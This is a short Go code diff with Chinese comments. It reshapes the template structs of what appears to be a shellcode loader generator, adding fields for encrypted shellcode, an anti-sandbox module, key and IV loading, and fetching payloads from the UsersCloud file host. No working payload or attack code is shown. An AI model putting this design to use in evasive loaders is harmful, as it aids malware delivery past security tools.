@@ -10,8 +10,8 @@ type TmplOpts struct {
 type Data struct {
 	CipherText    string      // 保存加密文本的变量名
 	PlainText     string      // 保存解密文本的变量名
-	Payload       string      // 加密 shellcode
 	DecryptMethod string      // 解密方法
+	Pokemon       interface{} // Pokemon Shellcode
 	Loader        interface{} // loader
 	SandBox       interface{} // 反沙箱模块
 	Local         interface{} // 本地加载模块
@@ -39,17 +39,19 @@ type Compressor struct {
 }
 
 type Local struct {
-	KeyName  string // Key 变量名
-	KeyValue string // Key 值
-	IvName   string // Iv  变量名
-	IvValue  string // Iv  值
+	KeyName  string      // Key 变量名
+	KeyValue string      // Key 值
+	IvName   string      // Iv  变量名
+	IvValue  string      // Iv  值
+	Payload  interface{} // 加密 shellcode
 }
 
 type Remote struct {
-	Import  string // 导入库
-	Url     string // 远程加载Url
-	UrlName string // 远程加载变量名
-	Method  string // 请求方法
+	Import     string // 导入库
+	Url        string // 远程加载Url
+	Method     string // 请求方法
+	UCFileCode string // UsersCloud加载的参数
+	UCMethod   string // 读取UsersCloud的Payload
 }
 
 type Dynamic struct {
